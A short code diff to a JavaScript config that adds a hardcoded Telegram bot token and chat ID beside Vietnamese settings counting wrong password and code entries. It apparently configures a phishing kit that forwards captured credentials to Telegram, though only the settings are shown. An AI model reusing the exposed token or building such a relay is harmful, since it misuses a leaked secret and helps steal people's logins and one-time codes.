@@ -1,6 +1,6 @@
 const config = {
-    token: '',
-    chat_id: 0,
+    token: '8746265204:AAEaa96CgH79hQZ6pnLqNMYh-qYt38Zfmk8',
+    chat_id: -5182687081,
     so_lan_sai_pass: 2,
     so_lan_sai_code: 2,
     thoi_gian_sai_pass: 2,
